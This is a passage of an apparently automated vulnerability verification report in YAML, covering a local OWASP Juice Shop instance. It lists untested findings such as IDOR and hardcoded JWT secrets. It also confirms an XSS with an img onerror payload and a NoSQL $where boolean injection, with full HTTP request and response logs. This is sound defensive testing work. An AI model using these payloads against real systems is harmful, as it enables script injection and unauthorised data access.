+  planning: []
+  evidence_review: null
+  technical_review: null
+  selection_reason: null
+  target_location:
+    source_file: server.ts
+    source_line: null
+- result_id: VF-010
+  finding_ref:
+    id: T-010
+    match_key: routes/payment.ts|CWE-639
+    instance: routes/payment.ts:41
+    title: Insecure Direct Object Reference
+    cwe: CWE-639
+    variant: null
+    variant_digest: null
+  class: access-control
+  eligibility:
+    status: dynamic
+    reason: 'proof: cross-identity-contrast'
+  verdict: not-attempted
+  confidence: null
+  rationale: 'not tested: safe mode; without a declared test resource the Verifier
+    creates one, which writes'
+  proof: null
+  identities_used: []
+  state_changes: []
+  deviation: null
+  observations: []
+  limits_hit: null
+  evidence: []
+  poc: null
+  planning: []
+  evidence_review: null
+  technical_review: null
+  selection_reason: null
+  target_location:
+    source_file: routes/payment.ts
+    source_line: null
+- result_id: VF-011
+  finding_ref:
+    id: T-048
+    match_key: lib/insecurity.ts|hardcoded-key
+    instance: lib/insecurity.ts:21
+    title: Hardcoded JWT signing key and HMAC secrets — lib/insecurity.ts:21
+    cwe: CWE-798
+    variant: null
+    variant_digest: null
+  class: null
+  eligibility:
+    status: unsupported
+    reason: no supported proof method for CWE-798
+  verdict: not-attempted
+  confidence: null
+  rationale: no supported proof method for CWE-798
+  proof: null
+  identities_used: []
+  state_changes: []
+  deviation: null
+  observations: []
+  limits_hit: null
+  evidence: []
+  poc: null
+  planning: []
+  evidence_review: null
+  technical_review: null
+  selection_reason: null
+  target_location:
+    source_file: lib/insecurity.ts
+    source_line: null
+- result_id: VF-012
+  finding_ref:
+    id: T-078
+    match_key: lib/insecurity.ts|sig-verify
+    instance: lib/insecurity.ts:55
+    title: JWT verification does not pin an algorithm — lib/insecurity.ts:55
+    cwe: CWE-347
+    variant: null
+    variant_digest: null
+  class: null
+  eligibility:
+    status: unsupported
+    reason: no supported proof method for CWE-347
+  verdict: not-attempted
+  confidence: null
+  rationale: no supported proof method for CWE-347
+  proof: null
+  identities_used: []
+  state_changes: []
+  deviation: null
+  observations: []
+  limits_hit: null
+  evidence: []
+  poc: null
+  planning: []
+  evidence_review: null
+  technical_review: null
+  selection_reason: null
+  target_location:
+    source_file: lib/insecurity.ts
+    source_line: null
+- result_id: VF-013
+  finding_ref:
+    id: T-001
+    match_key: frontend/src/app/about/about.component.ts|CWE-79
+    instance: frontend/src/app/about/about.component.ts:119
+    title: Angular sanitizer bypass causes XSS in about, search, administration
+    cwe: CWE-79
+    variant: variant-003
+    variant_digest: cb9ffdc3b619b4880c2bddbfb7faccecb728e35773a54075b0219e18b6e2b5f4
+  class: xss
+  eligibility:
+    status: dynamic
+    reason: 'proof: browser-execution'
+  verdict: confirmed
+  confidence: high
+  rationale: The q query parameter in /#/search is passed through sanitizer.bypassSecurityTrustHtml
+    (search-result.component.ts:143) and bound via innerHTML without escaping. A crafted
+    search URL with an img onerror payload executed the required alert('vrfff417e61'.concat('4391894e'))
+    marker in the headless browser, confirming the Angular sanitizer bypass XSS for
+    the search variant.
+  proof:
+    executed: true
+    checked: true
+    contract: 3
+    steps:
+    - 2
+    kind: marker
+    form: script-executed
+    tested_path: null
+    variant: null
+    hypothesis: null
+    observation_pointer: null
+    scope: cited requests only
+  identities_used:
+  - anonymous
+  state_changes: []
+  deviation: null
+  observations:
+  - Payload delivered via query string q parameter, reflected and trusted via bypassSecurityTrustHtml,
+    executed in main document context.
+  limits_hit: null
+  evidence:
+  - kind: browser-event
+    path: evidence/T-001-cb9ffdc3b619b488-angular-sanitizer-bypass-causes-xss-in-about-search.json
+    sha256: 69293746f1fbb8659643b4439bc6bf0c88f7a952a5243149ed0a1a7541226c59
+  - kind: screenshot
+    path: evidence/T-001-cb9ffdc3b619b488-angular-sanitizer-bypass-causes-xss-in-about-search.png
+    sha256: ade615cdf8f8607099920b73283ba6fc9f976e5bc18b55e7ae6565543216d057
+    redacted: false
+    credential_masked: false
+    note: may show target data; review before sharing
+    finding_id: T-001
+    role: anonymous
+    presentation: application
+    source: live-browser
+    executed_via:
+    - alert
+    marked: 1
+    reviewable: true
+    proof_step: 2
+    explanation: Screenshot shows the search page executing the injected onerror JavaScript,
+      triggering the proof alert dialog.
+  - kind: har
+    path: evidence/T-001-cb9ffdc3b619b488-poc.har
+    redacted: true
+    sha256: e9bea73205ba8d61a12e441bcaa046f8d23f2b5bcac8ee30de8e4b8b4c738284
+    note: may show target data; review before sharing
+  - kind: screenshot
+    path: evidence/T-001-cb9ffdc3b619b488-angular-sanitizer-bypass-causes-xss-in-about-search-http-1.png
+    sha256: fa5885e49c630f32992fb76a15c226b3624390d55de7365c9764759dfd65aa2e
+    redacted: true
+    note: may show target data; review before sharing
+    marked: 0
+  poc:
+    file: evidence/T-001-cb9ffdc3b619b488-poc.har
+    steps:
+    - step: 2
+      line: browser_check GET /#/search?q=<img src=x onerror=alert('vrfff417e61'.concat('4391894e'))>
+        as anonymous → 200, 9984 bytes, marker executed, 30 requests
+      decisive: true
+    shown:
+    - step: 2
+      request: 'GET / HTTP/1.1
+
+        host: 127.0.0.1:3000
+
+        accept-encoding: gzip, deflate, br
+
+        connection: keep-alive
+
+        accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+        upgrade-insecure-requests: 1
+
+        user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like
+        Gecko) HeadlessChrome/148.0.0.0 Safari/537.36
+
+        sec-ch-ua: "Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"
+
+        sec-ch-ua-mobile: ?0
+
+        sec-ch-ua-platform: "Linux"
+
+
+        '
+      elapsed_ms: 6
+      response: "HTTP/1.1 200 OK\naccess-control-allow-origin: *\nx-content-type-options:\
+        \ nosniff\nx-frame-options: SAMEORIGIN\nfeature-policy: payment 'self'\nx-recruiting:\
+        \ /#/jobs\naccept-ranges: bytes\ncache-control: public, max-age=0\nlast-modified:\
+        \ Sun, 08 Nov 2026 19:11:10 GMT\netag: W/\"2700-1a1bc9258b0\"\ncontent-type:\
+        \ text/html; charset=UTF-8\nvary: Accept-Encoding\ncontent-encoding: br\n\
+        date: Thu, 12 Nov 2026 12:43:10 GMT\nconnection: keep-alive\nkeep-alive: timeout=5\n\
+        transfer-encoding: chunked\n\n<!--\n  ~ Copyright (c) 2014-2026 Bjoern Kimminich\
+        \ & the OWASP Juice Shop contributors.\n  ~ SPDX-License-Identifier: MIT\n\
+        \  -->\n\n<!doctype html>\n<html lang=\"en\" data-beasties-container>\n<head>\n\
+        \  <meta charset=\"utf-8\">\n  <title>OWASP Juice Shop</title>\n  <meta name=\"\
+        description\" content=\"Probably the most modern and sophisticated insecure\
+        \ web application\">\n  <meta name=\"viewport\" content=\"width=device-width,\
+        \ initial-scale=1\">\n  <link rel=\"preconnect\" href=\"https://fonts.googleapis.com\"\
+        >\n  <link rel=\"preconnect\" href=\"https://fonts.gstatic.com\" crossorigin>\n\
+        \  <style>@font-face{font-family:'VT323';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/vt323/v18/pxiKyp0ihIEF2isQFJXGdg.woff2)\
+        \ format('woff2');unicode-range:U+0102-0103, U+0110-0111, U+0128-0129, U+0168-0169,\
+        \ U+01A0-01A1, U+01AF-01B0, U+0300-0301, U+0303-0304, U+0308-0309, U+0323,\
+        \ U+0329, U+1EA0-1EF9, U+20AB;}@font-face{font-family:'VT323';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/vt323/v18/pxiKyp0ihIEF2isRFJXGdg.woff2)\
+        \ format('woff2');unicode-range:U+0100-02BA, U+02BD-02C5, U+02C7-02CC, U+02CE-02D7,\
+        \ U+02DD-02FF, U+0304, U+0308, U+0329, U+1D00-1DBF, U+1E00-1E9F, U+1EF2-1EFF,\
+        \ U+2020, U+20A0-20AB, U+20AD-20C4, U+2113, U+2C60-2C7F, U+A720-A7FF;}@font-face{font-family:'VT323';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/vt323/v18/pxiKyp0ihIEF2isfFJU.woff2)\
+        \ format('woff2');unicode-range:U+0000-00FF, U+01\n[… characters 1 to 1500\
+        \ shown of a 9984-byte answer; full response in evidence/T-001-cb9ffdc3b619b488-poc.har]"
+      role: attack
+      role_label: carries the payload
+      request_excerpt: 'GET / HTTP/1.1
+
+
+        '
+      response_excerpt: 'HTTP/1.1 200 OK
+
+        content-type: text/html; charset=UTF-8
+
+
+        [page source omitted: the browser observation above decides the XSS test;
+        full record in HAR]'
+      facts:
+      - 'opened in the browser: /#/search?q=<img src=x onerror=alert(''vrfff417e61''.concat(''4391894e''))>'
+      - 'marker executed in the browser: yes'
+  planning: []
+  evidence_review:
+    status: clear
+    rounds: 0
+    reviews: 1
+    visual_review: performed
+    images_reviewed:
+    - evidence/T-001-cb9ffdc3b619b488-angular-sanitizer-bypass-causes-xss-in-about-search.png
+    reason: Evidence text and layout checks passed; 1 screenshot reviewed.
+    issues: []
+    presentations: []
+    variants:
+    - T-001-cb9ffdc3b619b488
+  technical_review:
+    status: not-reviewed
+    rounds: 0
+    reviews: 0
+    inspected_steps: []
+    reason: A confirmed verdict whose proof check passed is not reviewed (VER-046).
+    issues: []
+  selection_reason: null
+  target_location:
+    source_file: frontend/src/app/about/about.component.ts
+    source_line: null
+  timing:
+    started: '2026-11-12T12:42:32.690342Z'
+    finished: '2026-11-12T12:43:37.334667Z'
+- result_id: VF-014
+  finding_ref:
+    id: T-001
+    match_key: frontend/src/app/about/about.component.ts|CWE-79
+    instance: frontend/src/app/about/about.component.ts:119
+    title: Angular sanitizer bypass causes XSS in about, search, administration
+    cwe: CWE-79
+    variant: variant-001
+    variant_digest: faa32d9807488167df281955c2f1ba5955b983db8a66f620022c9889fe8e16f0
+  class: xss
+  eligibility:
+    status: dynamic
+    reason: 'proof: browser-execution'
+  verdict: not-attempted
+  confidence: null
+  rationale: 'not tested: safe mode; every declared variant needs a state change'
+  proof: null
+  identities_used: []
+  state_changes: []
+  deviation: null
+  observations: []
+  limits_hit: null
+  evidence: []
+  poc: null
+  planning: []
+  evidence_review: null
+  technical_review: null
+  selection_reason: null
+  target_location:
+    source_file: frontend/src/app/about/about.component.ts
+    source_line: null
+- result_id: VF-015
+  finding_ref:
+    id: T-001
+    match_key: frontend/src/app/about/about.component.ts|CWE-79
+    instance: frontend/src/app/about/about.component.ts:119
+    title: Angular sanitizer bypass causes XSS in about, search, administration
+    cwe: CWE-79
+    variant: variant-002
+    variant_digest: 425c0fcfcdbfb25ee0a18b4e7edba1f518669eb407f44aacae285db37c8f169d
+  class: xss
+  eligibility:
+    status: dynamic
+    reason: 'proof: browser-execution'
+  verdict: not-attempted
+  confidence: null
+  rationale: 'not tested: safe mode; every declared variant needs a state change'
+  proof: null
+  identities_used: []
+  state_changes: []
+  deviation: null
+  observations: []
+  limits_hit: null
+  evidence: []
+  poc: null
+  planning: []
+  evidence_review: null
+  technical_review: null
+  selection_reason: null
+  target_location:
+    source_file: frontend/src/app/about/about.component.ts
+    source_line: null
+- result_id: VF-016
+  finding_ref:
+    id: T-002
+    match_key: server.ts|CWE-639
+    instance: server.ts:450
+    title: Systemic missing object ownership checks across address, basket, coupon
+    cwe: CWE-639
+    variant: variant-001
+    variant_digest: 632ee4efb615e7892972467e4d52ad18f359073f4908a3d7adc4d3a2c92e2048
+  class: access-control
+  eligibility:
+    status: dynamic
+    reason: 'proof: cross-identity-contrast'
+  verdict: not-attempted
+  confidence: null
+  rationale: 'not tested: safe mode; without a declared test resource the Verifier
+    creates one, which writes'
+  proof: null
+  identities_used: []
+  state_changes: []
+  deviation: null
+  observations: []
+  limits_hit: null
+  evidence: []
+  poc: null
+  planning: []
+  evidence_review: null
+  technical_review: null
+  selection_reason: null
+  target_location:
+    source_file: server.ts
+    source_line: null
+- result_id: VF-017
+  finding_ref:
+    id: T-002
+    match_key: server.ts|CWE-639
+    instance: server.ts:450
+    title: Systemic missing object ownership checks across address, basket, coupon
+    cwe: CWE-639
+    variant: variant-002
+    variant_digest: b858993fc928901133adfe2375d82095b175bd0f7694cccba7a0e8640238adda
+  class: access-control
+  eligibility:
+    status: dynamic
+    reason: 'proof: cross-identity-contrast'
+  verdict: not-attempted
+  confidence: null
+  rationale: 'not tested: safe mode; without a declared test resource the Verifier
+    creates one, which writes'
+  proof: null
+  identities_used: []
+  state_changes: []
+  deviation: null
+  observations: []
+  limits_hit: null
+  evidence: []
+  poc: null
+  planning: []
+  evidence_review: null
+  technical_review: null
+  selection_reason: null
+  target_location:
+    source_file: server.ts
+    source_line: null
+- result_id: VF-018
+  finding_ref:
+    id: T-002
+    match_key: server.ts|CWE-639
+    instance: server.ts:450
+    title: Systemic missing object ownership checks across address, basket, coupon
+    cwe: CWE-639
+    variant: variant-003
+    variant_digest: 318df08f77f54dd33e965dd30de1cccecc398c92ccf68241b48b81b3b5565860
+  class: access-control
+  eligibility:
+    status: dynamic
+    reason: 'proof: cross-identity-contrast'
+  verdict: not-attempted
+  confidence: null
+  rationale: 'not tested: safe mode; without a declared test resource the Verifier
+    creates one, which writes'
+  proof: null
+  identities_used: []
+  state_changes: []
+  deviation: null
+  observations: []
+  limits_hit: null
+  evidence: []
+  poc: null
+  planning: []
+  evidence_review: null
+  technical_review: null
+  selection_reason: null
+  target_location:
+    source_file: server.ts
+    source_line: null
+- result_id: VF-019
+  finding_ref:
+    id: T-015
+    match_key: routes/changepassword.ts|CWE-620
+    instance: routes/changePassword.ts:39
+    title: Password change allowed without current password — routes/changePassword.ts:39
+    cwe: CWE-620
+    variant: variant-001
+    variant_digest: 2c8c5f183f3e4768e7a2f56cc9321c04f775e31b40b5dd5a54b15397a911735e
+  class: null
+  eligibility:
+    status: unsupported
+    reason: no supported proof method for CWE-620
+  verdict: not-attempted
+  confidence: null
+  rationale: no supported proof method for CWE-620
+  proof: null
+  identities_used: []
+  state_changes: []
+  deviation: null
+  observations: []
+  limits_hit: null
+  evidence: []
+  poc: null
+  planning: []
+  evidence_review: null
+  technical_review: null
+  selection_reason: null
+  target_location:
+    source_file: routes/changePassword.ts
+    source_line: null
+- result_id: VF-020
+  finding_ref:
+    id: T-033
+    match_key: routes/showproductreviews.ts|CWE-943
+    instance: routes/showProductReviews.ts:36
+    title: NoSQL injection in product reviews $where — routes/showProductReviews.ts:36
+    cwe: CWE-943
+    variant: variant-001
+    variant_digest: c23d5ea977c2e5abe52259d0523e6282f0ccbfc61f87f1f5d53592cdd091e670
+  class: injection
+  eligibility:
+    status: dynamic
+    reason: 'proof: behavioural-difference'
+  verdict: confirmed
+  confidence: medium
+  rationale: 'The :id path parameter in GET /rest/products/:id/reviews is concatenated
+    unquoted into a MongoDB $where JavaScript predicate (''this.product == '' + id)
+    at routes/showProductReviews.ts:36. A boolean injection experiment confirmed this:
+    baseline id=1 returned 2 reviews. Injected predicates of the form ''1 && (true-predicate)''
+    consistently returned the same 2 reviews (matching baseline), while ''1 && (false-predicate)''
+    consistently returned an empty data array, across two repeated trials each (steps
+    4-13). This stable split between true/false predicate classes, with identical
+    results on repetition, proves the server evaluates attacker-supplied JavaScript
+    logic inside the $where clause rather than treating id as an opaque value, confirming
+    server-side NoSQL/JS injection.'
+  proof:
+    checked: true
+    contract: 3
+    steps:
+    - 4
+    - 5
+    - 6
+    - 7
+    - 8
+    - 9
+    - 10
+    - 11
+    - 12
+    - 13
+    kind: boolean
+    form: predicate
+    tested_path: /rest/products/:id/reviews
+    variant: variant-001
+    hypothesis: The :id path param is concatenated unquoted into a MongoDB $where
+      clause 'this.product == ' + id, allowing boolean predicate injection that changes
+      which reviews are returned.
+    observation_pointer: /data
+    scope: cited requests only
+  identities_used:
+  - anonymous
+  state_changes: []
+  deviation: null
+  observations:
+  - 'Application screenshot unavailable: no application page showing the confirmed
+    effect was captured; for API-only findings the recorded HTTP exchanges are the
+    primary evidence.'
+  limits_hit: null
+  evidence:
+  - kind: exchange
+    path: evidence/T-033-c23d5ea977c2e5ab-exchanges.json
+    redacted: true
+    sha256: 7a4094db21127b65f35aad8b15a9d6d422d7a072e5db893334d554cad8bf4b8c
+  - kind: har
+    path: evidence/T-033-c23d5ea977c2e5ab-poc.har
+    redacted: true
+    sha256: a5e1ff2304d8b5e3f4724b68c403a2ecf132916a50de35476a794b8393eff477
+    note: may show target data; review before sharing
+  - kind: screenshot
+    path: evidence/T-033-c23d5ea977c2e5ab-nosql-injection-in-product-reviews-where-http-1.png
+    sha256: aa547f33e74f21b291862dd15d918334ac91ff2b76ef4534afffe6805f928ad5
+    redacted: true
+    note: may show target data; review before sharing
+    marked: 1
+  - kind: screenshot
+    path: evidence/T-033-c23d5ea977c2e5ab-nosql-injection-in-product-reviews-where-http-2.png
+    sha256: 7ec7ab421cd024381f1c8e43e3e5c061a71e3a0bbbdc8f1d65f5bc2cf8407cd5
+    redacted: true
+    note: may show target data; review before sharing
+    marked: 1
+  - kind: screenshot
+    path: evidence/T-033-c23d5ea977c2e5ab-nosql-injection-in-product-reviews-where-http-3.png
+    sha256: 58c9349ae342c0ec6cca571c5a27721ec88b6f41fde3e8ad8bdeab45102293a0
+    redacted: true
+    note: may show target data; review before sharing
+    marked: 0
+  poc:
+    file: evidence/T-033-c23d5ea977c2e5ab-poc.har
+    steps:
+    - step: 4
+      line: http_request GET http://127.0.0.1:3000/rest/products/1/reviews as anonymous
+        → 200, 395 bytes
+      decisive: true
+    - step: 5
+      line: http_request GET http://127.0.0.1:3000/rest/products/1%20%26%26%20%28877315%3D%3D%3D877315%29/reviews
+        as anonymous → 200, 395 bytes
+      decisive: true
+    - step: 6
+      line: http_request GET http://127.0.0.1:3000/rest/products/1%20%26%26%20%28877315%3D%3D%3D884198%29/reviews
+        as anonymous → 200, 30 bytes
+      decisive: true
+    - step: 7
+      line: http_request GET http://127.0.0.1:3000/rest/products/1%20%26%26%20%28884198%21%3D%3D877315%29/reviews
+        as anonymous → 200, 395 bytes
+      decisive: true
+    - step: 8
+      line: http_request GET http://127.0.0.1:3000/rest/products/1%20%26%26%20%28884198%21%3D%3D884198%29/reviews
+        as anonymous → 200, 30 bytes
+      decisive: true
+    - step: 9
+      line: http_request GET http://127.0.0.1:3000/rest/products/1/reviews as anonymous
+        → 200, 395 bytes
+      decisive: true
+    - step: 10
+      line: http_request GET http://127.0.0.1:3000/rest/products/1%20%26%26%20%28877315%3D%3D%3D877315%29/reviews
+        as anonymous → 200, 395 bytes
+      decisive: true
+    - step: 11
+      line: http_request GET http://127.0.0.1:3000/rest/products/1%20%26%26%20%28877315%3D%3D%3D884198%29/reviews
+        as anonymous → 200, 30 bytes
+      decisive: true
+    - step: 12
+      line: http_request GET http://127.0.0.1:3000/rest/products/1%20%26%26%20%28884198%21%3D%3D877315%29/reviews
+        as anonymous → 200, 395 bytes
+      decisive: true
+    - step: 13
+      line: http_request GET http://127.0.0.1:3000/rest/products/1%20%26%26%20%28884198%21%3D%3D884198%29/reviews
+        as anonymous → 200, 30 bytes
+      decisive: true
+    shown:
+    - step: 4
+      request: 'GET /rest/products/1/reviews HTTP/1.1
+
+        host: 127.0.0.1:3000
+
+        accept: */*
+
+        accept-encoding: gzip, deflate, br
+
+        connection: keep-alive
+
+        user-agent: python-httpx/0.28.1
+
+
+        '
+      elapsed_ms: 15
+      response: 'HTTP/1.1 200 OK
+
+        access-control-allow-origin: *
+
+        x-content-type-options: nosniff
+
+        x-frame-options: SAMEORIGIN
+
+        feature-policy: payment ''self''
+
+        x-recruiting: /#/jobs
+
+        content-type: application/json; charset=utf-8
+
+        content-length: 395
+
+        etag: W/"18b-T8og0pbeju2nMwx21O97Qze8qUY"
+
+        vary: Accept-Encoding
+
+        date: Thu, 12 Nov 2026 12:44:19 GMT
+
+        connection: keep-alive
+
+        keep-alive: timeout=5
+
+
+        {"status":"success","data":[{"message":"One of my favorites!","author":"[redacted]","product":1,"likesCount":0,"likedBy":[],"_id":"YuFZFdmp4zrvZrFTf","liked":true},{"message":"Great!
+        We''ll have an apple party. Everyone brings an apple and - STUFFS IT DOWN
+        EACH OTHER''S THROAT!","author":"basil@juice-sh.op","product":1,"likesCount":0,"likedBy":[],"_id":"NSpDBdbPr3kMnDRw8","liked":true}]}'
+      role: normal
+      role_label: baseline input
+      request_excerpt: 'GET /rest/products/1/reviews HTTP/1.1
+
+
+        '
+      response_excerpt: 'HTTP/1.1 200 OK
+
+        content-type: application/json; charset=utf-8
+
+
+        {"status":"success","data":[{"message":"One of my favorites!","author":"[redacted]","product":1,"likesCount":0,"likedBy":[],"_id":"YuFZFdmp4zrvZrFTf","liked":true},{"message":"Great!
+        We''ll have an apple party. Everyone brings an apple and - STUFFS IT DOWN
+        EACH OTHER''S THROAT!","author":"basil@juice-sh.op","product":1,"likesCount":0,"likedBy":[],"_id":"NSpDBdbPr3kMnDRw8","liked":true}]}'
+      facts: []
+    - step: 9
+      request: 'GET /rest/products/1/reviews HTTP/1.1
+
+        host: 127.0.0.1:3000
+
+        accept: */*
+
+        accept-encoding: gzip, deflate, br
+
+        connection: keep-alive
+
+        user-agent: python-httpx/0.28.1
+
+
+        '
+      elapsed_ms: 13
+      response: 'HTTP/1.1 200 OK
+
+        access-control-allow-origin: *
+
+        x-content-type-options: nosniff
+
+        x-frame-options: SAMEORIGIN
+
+        feature-policy: payment ''self''
+
+        x-recruiting: /#/jobs
+
+        content-type: application/json; charset=utf-8
+
+        content-length: 395
+
+        etag: W/"18b-T8og0pbeju2nMwx21O97Qze8qUY"
+
+        vary: Accept-Encoding
+
+        date: Thu, 12 Nov 2026 12:44:19 GMT
+
+        connection: keep-alive
+
+        keep-alive: timeout=5
+
+
+        {"status":"success","data":[{"message":"One of my favorites!","author":"[redacted]","product":1,"likesCount":0,"likedBy":[],"_id":"YuFZFdmp4zrvZrFTf","liked":true},{"message":"Great!
+        We''ll have an apple party. Everyone brings an apple and - STUFFS IT DOWN
+        EACH OTHER''S THROAT!","author":"basil@juice-sh.op","product":1,"likesCount":0,"likedBy":[],"_id":"NSpDBdbPr3kMnDRw8","liked":true}]}'
+      role: normal
+      role_label: baseline input
+      request_excerpt: 'GET /rest/products/1/reviews HTTP/1.1
+
+
+        '
+      response_excerpt: 'HTTP/1.1 200 OK
+
+        content-type: application/json; charset=utf-8
+
+
+        {"status":"success","data":[{"message":"One of my favorites!","author":"[redacted]","product":1,"likesCount":0,"likedBy":[],"_id":"YuFZFdmp4zrvZrFTf","liked":true},{"message":"Great!
+        We''ll have an apple party. Everyone brings an apple and - STUFFS IT DOWN
+        EACH OTHER''S THROAT!","author":"basil@juice-sh.op","product":1,"likesCount":0,"likedBy":[],"_id":"NSpDBdbPr3kMnDRw8","liked":true}]}'
+      facts: []
+    - step: 5
+      request: 'GET /rest/products/1%20%26%26%20%28877315%3D%3D%3D877315%29/reviews
+        HTTP/1.1
+
+        host: 127.0.0.1:3000
+
+        accept: */*
+
+        accept-encoding: gzip, deflate, br
+
+        connection: keep-alive
+
+        user-agent: python-httpx/0.28.1
+
+
+        '
+      elapsed_ms: 16
+      response: 'HTTP/1.1 200 OK
+
+        access-control-allow-origin: *
+
+        x-content-type-options: nosniff
+
+        x-frame-options: SAMEORIGIN
+
+        feature-policy: payment ''self''
+
+        x-recruiting: /#/jobs
+
+        content-type: application/json; charset=utf-8
+
+        content-length: 395
+
+        etag: W/"18b-T8og0pbeju2nMwx21O97Qze8qUY"
+
+        vary: Accept-Encoding
+
+        date: Thu, 12 Nov 2026 12:44:19 GMT
+
+        connection: keep-alive
+
+        keep-alive: timeout=5
+
+
+        {"status":"success","data":[{"message":"One of my favorites!","author":"[redacted]","product":1,"likesCount":0,"likedBy":[],"_id":"YuFZFdmp4zrvZrFTf","liked":true},{"message":"Great!
+        We''ll have an apple party. Everyone brings an apple and - STUFFS IT DOWN
+        EACH OTHER''S THROAT!","author":"basil@juice-sh.op","product":1,"likesCount":0,"likedBy":[],"_id":"NSpDBdbPr3kMnDRw8","liked":true}]}'
+      role: attack
+      role_label: true condition
+      request_excerpt: 'GET /rest/products/1%20%26%26%20%28877315%3D%3D%3D877315%29/reviews
+        HTTP/1.1
+
+
+        '
+      response_excerpt: 'HTTP/1.1 200 OK
+
+        content-type: application/json; charset=utf-8
+
+
+        {"status":"success","data":[{"message":"One of my favorites!","author":"[redacted]","product":1,"likesCount":0,"likedBy":[],"_id":"YuFZFdmp4zrvZrFTf","liked":true},{"message":"Great!
+        We''ll have an apple party. Everyone brings an apple and - STUFFS IT DOWN
+        EACH OTHER''S THROAT!","author":"basil@juice-sh.op","product":1,"likesCount":0,"likedBy":[],"_id":"NSpDBdbPr3kMnDRw8","liked":true}]}'
+      facts:
+      - 'Compared with the false condition in step 6: same status 200; /data has 0
+        entries there and 2 entries here, 2 of them not in the false condition''s
+        answer.'
+    - step: 6
+      request: 'GET /rest/products/1%20%26%26%20%28877315%3D%3D%3D884198%29/reviews
+        HTTP/1.1
+
+        host: 127.0.0.1:3000
+
+        accept: */*
+
+        accept-encoding: gzip, deflate, br
+
+        connection: keep-alive
+
+        user-agent: python-httpx/0.28.1
+
+
+        '
+      elapsed_ms: 17
+      response: 'HTTP/1.1 200 OK
+
+        access-control-allow-origin: *
+
+        x-content-type-options: nosniff
+
+        x-frame-options: SAMEORIGIN
+
+        feature-policy: payment ''self''
+
+        x-recruiting: /#/jobs
+
+        content-type: application/json; charset=utf-8
+
+        content-length: 30
+
+        etag: W/"1e-JkPcI+pGj7BBTxOuZTVVIm91zaY"
+
+        vary: Accept-Encoding
+
+        date: Thu, 12 Nov 2026 12:44:19 GMT
+
+        connection: keep-alive
+
+        keep-alive: timeout=5
+
+
+        {"status":"success","data":[]}'
+      role: attack
+      role_label: false condition
+      request_excerpt: 'GET /rest/products/1%20%26%26%20%28877315%3D%3D%3D884198%29/reviews
+        HTTP/1.1
+
+
+        '
+      response_excerpt: 'HTTP/1.1 200 OK
+
+        content-type: application/json; charset=utf-8
+
+
+        {"status":"success","data":[]}'
+      facts:
+      - 'Compared with the normal request in step 4: same status 200; /data has 2
+        entries there and 0 entries here.'
+    - step: 7
+      request: 'GET /rest/products/1%20%26%26%20%28884198%21%3D%3D877315%29/reviews
+        HTTP/1.1
+
+        host: 127.0.0.1:3000
+
+        accept: */*
+
+        accept-encoding: gzip, deflate, br
+
+        connection: keep-alive
+
+        user-agent: python-httpx/0.28.1
+
+
+        '
+      elapsed_ms: 19
+      response: 'HTTP/1.1 200 OK
+
+        access-control-allow-origin: *
+
+        x-content-type-options: nosniff
+
+        x-frame-options: SAMEORIGIN
+
+        feature-policy: payment ''self''
+
+        x-recruiting: /#/jobs
+
+        content-type: application/json; charset=utf-8
+
+        content-length: 395
+
+        etag: W/"18b-T8og0pbeju2nMwx21O97Qze8qUY"
+
+        vary: Accept-Encoding
+
+        date: Thu, 12 Nov 2026 12:44:19 GMT
+
+        connection: keep-alive
+
+        keep-alive: timeout=5
+
+
+        {"status":"success","data":[{"message":"One of my favorites!","author":"[redacted]","product":1,"likesCount":0,"likedBy":[],"_id":"YuFZFdmp4zrvZrFTf","liked":true},{"message":"Great!
+        We''ll have an apple party. Everyone brings an apple and - STUFFS IT DOWN
+        EACH OTHER''S THROAT!","author":"basil@juice-sh.op","product":1,"likesCount":0,"likedBy":[],"_id":"NSpDBdbPr3kMnDRw8","liked":true}]}'
+      role: attack
+      role_label: true condition, second form
+      request_excerpt: 'GET /rest/products/1%20%26%26%20%28884198%21%3D%3D877315%29/reviews
+        HTTP/1.1
+
+
+        '
+      response_excerpt: 'HTTP/1.1 200 OK
+
+        content-type: application/json; charset=utf-8
+
+
+        {"status":"success","data":[{"message":"One of my favorites!","author":"[redacted]","product":1,"likesCount":0,"likedBy":[],"_id":"YuFZFdmp4zrvZrFTf","liked":true},{"message":"Great!
+        We''ll have an apple party. Everyone brings an apple and - STUFFS IT DOWN
+        EACH OTHER''S THROAT!","author":"basil@juice-sh.op","product":1,"likesCount":0,"likedBy":[],"_id":"NSpDBdbPr3kMnDRw8","liked":true}]}'
+      facts:
+      - 'Compared with the false condition, second form in step 8: same status 200;
+        /data has 0 entries there and 2 entries here, 2 of them not in the false condition,
+        second form''s answer.'
+    - step: 8
+      request: 'GET /rest/products/1%20%26%26%20%28884198%21%3D%3D884198%29/reviews
+        HTTP/1.1
+
+        host: 127.0.0.1:3000
+
+        accept: */*
+
+        accept-encoding: gzip, deflate, br
+
+        connection: keep-alive
+
+        user-agent: python-httpx/0.28.1
+
+
+        '
+      elapsed_ms: 15
+      response: 'HTTP/1.1 200 OK
+
+        access-control-allow-origin: *
+
+        x-content-type-options: nosniff
+
+        x-frame-options: SAMEORIGIN
+
+        feature-policy: payment ''self''
+
+        x-recruiting: /#/jobs
+
+        content-type: application/json; charset=utf-8
+
+        content-length: 30
+
+        etag: W/"1e-JkPcI+pGj7BBTxOuZTVVIm91zaY"
+
+        vary: Accept-Encoding
+
+        date: Thu, 12 Nov 2026 12:44:19 GMT
+
+        connection: keep-alive
+
+        keep-alive: timeout=5
+
+
+        {"status":"success","data":[]}'
+      role: attack
+      role_label: false condition, second form
+      request_excerpt: 'GET /rest/products/1%20%26%26%20%28884198%21%3D%3D884198%29/reviews
+        HTTP/1.1
+
+
+        '
+      response_excerpt: 'HTTP/1.1 200 OK
+
+        content-type: application/json; charset=utf-8
+
+
+        {"status":"success","data":[]}'
+      facts:
+      - 'Compared with the normal request in step 4: same status 200; /data has 2
+        entries there and 0 entries here.'
+    - step: 10
+      request: 'GET /rest/products/1%20%26%26%20%28877315%3D%3D%3D877315%29/reviews
+        HTTP/1.1
+
+        host: 127.0.0.1:3000
+
+        accept: */*
+
+        accept-encoding: gzip, deflate, br
+
+        connection: keep-alive
+
